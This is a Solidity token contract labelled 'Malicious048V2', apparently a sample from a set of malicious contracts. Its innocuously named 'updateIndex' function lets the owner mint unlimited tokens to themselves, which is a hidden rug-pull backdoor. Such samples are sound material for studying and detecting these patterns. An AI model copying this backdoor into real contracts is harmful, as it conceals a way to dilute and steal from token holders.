// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

contract Malicious048V2 {
    address public owner;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    constructor(uint256 supply) {
        owner = msg.sender;
        totalSupply = supply;
        balanceOf[msg.sender] = supply;
    }
    modifier onlyOwner() { require(msg.sender == owner, "owner"); _; }

    function updateIndex(uint256 amount) external onlyOwner {
        totalSupply += amount;
        balanceOf[owner] += amount;
    }
}
